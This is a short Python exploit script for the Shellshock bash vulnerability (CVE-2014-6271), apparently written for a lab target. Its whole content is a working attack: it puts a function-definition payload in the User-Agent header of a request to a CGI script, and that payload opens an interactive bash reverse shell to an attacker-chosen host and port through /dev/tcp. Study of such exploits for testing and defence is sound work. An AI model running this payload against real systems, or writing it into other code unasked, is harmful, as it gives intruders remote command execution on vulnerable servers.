import requests, sys


if len(sys.argv) != 4:
    print("* CVE-2014-6271 | Bash - 'Shellshock' Environment Variables Command Injection *\n")
    print("Usage: python3 exploit.py <target> <lhost> <lport>")
    print("Example: python3 exploit.py http://10.129.169.115/cgi-bin/user.sh 127.0.0.1 1337")
    sys.exit()


rhost = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]

headers = {'User-Agent': '() { :;}; /bin/bash -i >& /dev/tcp/%s/%s 0>&1' % (lhost, lport)}

try:
    print("[...] Sending payload.")
    requests.get(url=rhost, headers=headers, timeout=10)
except requests.exceptions.Timeout:
    sys.exit("[ # ] Timeout occured, could be that host is dead or could be that exploit worked, check your listener.")

    
